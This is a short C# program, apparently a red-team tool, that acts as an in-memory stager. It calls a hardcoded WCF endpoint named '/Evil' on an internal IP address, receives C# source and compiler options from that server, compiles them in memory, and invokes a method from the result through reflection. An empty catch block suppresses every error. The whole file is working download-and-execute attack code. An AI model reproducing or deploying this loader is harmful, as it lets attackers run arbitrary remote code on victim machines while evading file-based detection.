using System;
using System.Collections.Generic;
using System.ServiceModel;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Reflection;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    static void Main(string[] args)
    {
        try
        {        
            var binding = new BasicHttpBinding();
            binding.MaxReceivedMessageSize = Int32.MaxValue;
            var channel = new ChannelFactory<Interface2>(binding, "http://192.168.55.250:8080/Evil");
            var client = channel.CreateChannel();

            //Return source from server
            String[] source = client.compile1();        

            //Set Compiler Version
            Dictionary<string, string> Options = new Dictionary<string, string>
            {
                {source[1], source[2]}
            };

            //Pass provider info and params to compiler
            CSharpCodeProvider provider = new CSharpCodeProvider(Options);
            CompilerParameters compilerParams = new CompilerParameters();

            //Add References
            compilerParams.ReferencedAssemblies.Add(source[6]);
            compilerParams.ReferencedAssemblies.Add(source[7]);

            //Generate in Memory
            compilerParams.GenerateInMemory = true;

            //Compile and Execute
            CompilerResults results = provider.CompileAssemblyFromSource(compilerParams, source[0]);
            object o = results.CompiledAssembly.CreateInstance(source[3] + "." + source[4]);
            MethodInfo methodInfo = o.GetType().GetMethod(source[5]);
            methodInfo.Invoke(o, null);
        }
        catch
        { }
    }
}

//WCF Public Server Interface
[ServiceContract]
public interface Interface2
{
    [OperationContract]
    String[] compile1();
}

